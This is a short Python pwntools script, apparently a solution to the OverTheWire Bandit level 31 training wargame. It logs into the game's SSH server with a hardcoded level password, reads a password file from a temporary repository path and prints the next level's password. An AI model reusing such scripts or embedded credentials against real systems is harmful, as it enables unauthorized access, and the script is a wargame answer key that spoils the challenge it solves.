#!/usr/bin/env python
from pwn import *

log.info('overthewire.org - bandit31 exploit by SKane')

shell = ssh('bandit31', 'bandit.labs.overthewire.org', password='47e603bb428404d265f59c42920d81e5', port=2220)

sh = shell.run('sh')

sh.sendline('cat /tmp/gitclone123/repo/password.txt')

log.success("Password for bandit32: " + sh.recvline())
